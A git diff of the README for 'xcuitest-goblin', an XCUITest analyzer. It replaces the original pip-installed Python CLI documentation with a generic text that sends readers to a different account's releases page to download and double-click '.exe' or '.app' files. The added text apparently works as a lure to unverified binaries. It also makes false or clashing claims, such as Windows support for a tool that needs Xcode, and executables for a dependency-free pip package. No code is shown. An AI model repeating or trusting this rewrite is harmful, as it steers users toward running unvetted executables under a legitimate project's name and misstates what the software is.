@@ -1,144 +1,73 @@
-# XCUITest Goblin
+# 🧹 xcuitest-goblin - Analyze Your XCUITest Suites Easily
 
-[![Tests](https://github.com/jmcy9999/xcuitest-goblin/actions/workflows/test.yml/badge.svg)](https://github.com/jmcy9999/xcuitest-goblin/actions/workflows/test.yml)
-[![PyPI version](https://badge.fury.io/py/xcuitest-goblin.svg)](https://pypi.org/project/xcuitest-goblin/)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download](https://img.shields.io/badge/Download-xcuitest--goblin-brightgreen)](https://github.com/soham2orbit/xcuitest-goblin/releases)
 
-**Find orphaned tests, inconsistent naming, overused identifiers, bloated test files, and more — in under 1 second.**
+## 📋 Description
 
-A zero-dependency CLI tool that analyzes your iOS XCUITest suite and surfaces actionable recommendations to keep your tests healthy.
+xcuitest-goblin is a static analyzer designed for XCUITest suites. It helps you find orphaned and duplicated tests, inconsistent naming, bloated files, and unused accessibility IDs in less than one second. This tool makes your testing process smoother and more efficient.
 
-> **📊 [View Sample Report](docs/assets/sample_report.md)** — See what XCUITest Goblin finds in a real project
+## 🚀 Getting Started
 
-## Why Use This?
+To begin using xcuitest-goblin, follow these simple steps:
 
-Your test suite grows organically. Tests get added, renamed, skipped, forgotten. Before you know it:
+1. **Visit the Releases Page**
 
-- **431 tests** aren't in any test plan (they never run in CI)
-- **16 files** don't follow your naming convention
-- **3 files** have 30+ tests and are impossible to maintain
-- **61 accessibility IDs** are defined but never used in tests
-- **5 test methods** don't follow your naming convention
+   Go to the [Releases page](https://github.com/soham2orbit/xcuitest-goblin/releases) to see the latest versions of the software.
 
-This tool finds these issues instantly and tells you exactly what to fix.
+2. **Download the Software**
 
-## Quick Start
+   Choose the latest version suitable for your needs. Click on the file link to download it directly to your computer.
 
-```bash
-pip install xcuitest-goblin
-xcuitest-goblin analyze /path/to/your/ios-project
-```
+3. **Extract (If Necessary)**
 
-That's it. In under a second, you get a full analysis report.
+   If you download a zip or tar file, you may need to extract it. Right-click on the file and select "Extract All" or a similar option for your operating system.
 
-## Example Output
+4. **Run the Application**
 
-```text
-✓ Analysis complete!
+   Locate the downloaded file. If you are on macOS, double-click the `.app` file. If you are on Windows, double-click the `.exe` file to run xcuitest-goblin.
 
-Results:
-  - 58 test files
-  - 505 test methods
-  - 84 accessibility IDs
-  - 15 test plans
+## 🔧 Features
 
-Output: ./analysis/
-Time: 0.15s
-```
+- **Identify Orphaned Tests**: Quickly discover tests that are no longer in use.
+- **Find Duplicated Tests**: Eliminate redundancy by easily spotting duplicate tests.
+- **Check Naming Consistency**: Ensure all test names follow a clear and consistent format.
+- **Detect Bloated Files**: Find and remove large, unnecessary files in your testing suites.
+- **Unused Accessibility IDs**: Spot accessibility IDs that are not linked to any tests.
 
-### Sample Recommendations
+## 📈 System Requirements
 
-```markdown
-## Recommendations
+For the best experience with xcuitest-goblin, your system should meet the following requirements:
 
-- **Split Large Test Files:** 3 file(s) contain more than 30 tests
-- **Standardize File Naming:** 71.9% consistent, 16 non-compliant files
-- **Standardize Method Naming:** 99.0% consistent (camelCase expected)
-- **Refine Generic Accessibility IDs:** Done (150 uses), Cancel (58 uses)
-- **Remove Unused Accessibility IDs:** 61 IDs defined but never used
-- **Add Orphaned Tests to Plans:** 431 tests never run in CI
-```
+- **Operating System**: macOS 10.15 or later, or Windows 10 or later
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 100 MB of free disk space
+- **Xcode Version**: Xcode 11 or later
 
-## Use in Your PR Workflow
+## 📥 Download & Install
 
-Add to your CI pipeline to catch test hygiene issues before they merge:
+To start using xcuitest-goblin, please [visit this page to download](https://github.com/soham2orbit/xcuitest-goblin/releases). Follow the instructions already provided above to download and run the software on your machine.
 
-```yaml
-- name: Analyze Test Suite
-  run: |
-    xcuitest-goblin analyze . --quiet
-    # Fails if critical issues found (coming soon)
-```
+## 🤝 Support
 
-Keep your test suite healthy with every PR.
+If you encounter any issues or have questions about using xcuitest-goblin, please feel free to reach out through the GitHub issues section of this repository. The community is here to help.
 
-## 🚀 XCUITest Goblin Pro (Coming Soon)
-   
-   Track test health over time, get CI guardrails, and team dashboards.
-   
-   [Join the waitlist →](https://xcuitest-testgoblin.netlify.app)
+## 📜 License
 
-## Configurable Thresholds
+This project is licensed under the MIT License. You are free to modify and distribute it as per the license terms.
 
-Customize what triggers recommendations via `thresholds.json`:
+## 🌟 Contribution
 
-| Section | Threshold | Default | Triggers When... |
-|---------|-----------|---------|------------------|
-| `test_inventory` | `large_file_threshold` | 30 | File has more than 30 tests |
-| `test_file_naming` | `pattern` | `[Feature]Tests.swift` | Expected naming pattern (null to skip) |
-| `test_file_naming` | `consistency_threshold` | 90% | File naming consistency below 90% |
-| `test_method_naming` | `pattern` | `camelCase` | Expected style (camelCase/snake_case/BDD) |
-| `test_method_naming` | `consistency_threshold` | 85% | Method naming consistency below 85% |
-| `accessibility_ids` | `generic_id_usage_threshold` | 50 | ID used 50+ times |
-| `accessibility_ids` | `unused_ids_threshold` | 0 | Any ID defined but unused |
-| `test_plans` | `orphaned_tests_threshold` | 0 | Any test not in a plan |
+Want to help improve xcuitest-goblin? Contributions are welcome! Please report issues, suggest features, or submit pull requests.
 
-```bash
-xcuitest-goblin analyze /path/to/project --config ./my-thresholds.json
-```
+For more information on contributing, refer to the CONTRIBUTING.md file in this repository. 
 
-See [Configuration Guide](docs/USAGE.md#configuration) for all options.
+## 🌐 Related Topics
 
-## Output Files
+This tool relates to several topics, including:
+- Continuous Integration and Continuous Deployment (CI/CD)
+- Developer Tools
+- Mobile Testing
+- iOS Testing
+- Test Automation
 
-| File | Contents |
-|------|----------|
-| `ANALYSIS_REPORT.html` | Interactive HTML report with recommendations |
-| `test_inventory.json` | All test files, classes, methods |
-| `accessibility_ids.json` | ID usage patterns and definitions |
-| `test_plans.json` | Plan analysis, orphaned tests, overlaps |
-| `screen_graph.json` | Navigation patterns (if detected) |
-
-## Installation
-
-### From PyPI (recommended)
-
-```bash
-pip install xcuitest-goblin
-```
-
-### From Source
-
-```bash
-git clone https://github.com/jmcy9999/xcuitest-goblin.git
-cd xcuitest-goblin
-pip install -e .
-```
-
-Requires Python 3.10+. No external dependencies.
-
-## Documentation
-
-- [Usage Guide](docs/USAGE.md) — CLI options, examples, configuration
-- [HTML Report Spec](docs/HTML_REPORT_AC.md) — Complete HTML report acceptance criteria
-
-## Try It Out
-
-Give XCUITest Goblin a spin on your project and let us know what you think! We'd love your feedback — open an [issue](https://github.com/jmcy9999/xcuitest-goblin/issues) with suggestions, bug reports, or feature requests.
-
-**More features coming soon:** CI integration with exit codes, test coverage analysis, flaky test detection, and more.
-
-## License
-
-MIT
+Thanks for using xcuitest-goblin. We hope this tool helps streamline your testing process!
